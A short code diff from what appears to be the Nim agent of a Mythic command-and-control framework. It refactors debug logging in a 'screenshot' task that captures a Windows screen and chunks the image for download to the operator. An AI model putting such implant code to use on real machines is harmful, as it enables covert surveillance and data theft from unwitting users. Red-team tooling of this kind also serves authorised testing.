@@ -77,7 +77,7 @@ proc screenshot*(taskId: string, params: JsonNode): JsonNode =
   ## Screenshot - captures screen and initiates download to Mythic
   ## This is a background task that chunks the screenshot data
   when defined(windows):
-    debug "[DEBUG] Capturing screenshot"
+    debugLog "screenshot", "Capturing screenshot"
     
     try:
       # Capture screenshot
@@ -89,7 +89,7 @@ proc screenshot*(taskId: string, params: JsonNode): JsonNode =
       # Calculate chunks
       let totalChunks = int((screenshotData.len.float / CHUNK_SIZE.float).ceil)
       
-      debug &"[DEBUG] Screenshot captured: {screenshotData.len} bytes, {totalChunks} chunks"
+      debugLog "screenshot", &"Screenshot captured: {screenshotData.len} bytes, {totalChunks} chunks"
       
       # Send initial download response
       let downloadResponse = %*{
